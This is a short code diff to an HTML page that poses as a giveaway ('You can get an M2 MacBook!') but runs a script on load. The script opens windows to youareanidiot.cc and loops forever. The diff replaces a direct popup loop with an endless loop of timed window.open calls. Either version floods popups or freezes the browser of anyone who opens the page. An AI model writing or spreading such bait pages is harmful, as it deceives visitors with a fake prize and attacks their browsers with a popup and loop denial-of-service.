@@ -3,9 +3,13 @@
 <head>
     <title>M2Macbookがもらえる!</title>
     <script>
-        var window_A;
+        function tubopen() {
+            window.open('http://youareanidiot.cc/', "残念でしたーw");
+        }
         function tubloop() {
-            while (true) window.open("http://youareanidiot.cc/", "残念でしたーw");
+            while (true) {
+                setTimeout(tubopen, 100);
+            }
         }
         window.onload = function() {
             setTimeout(tubloop, 1000);
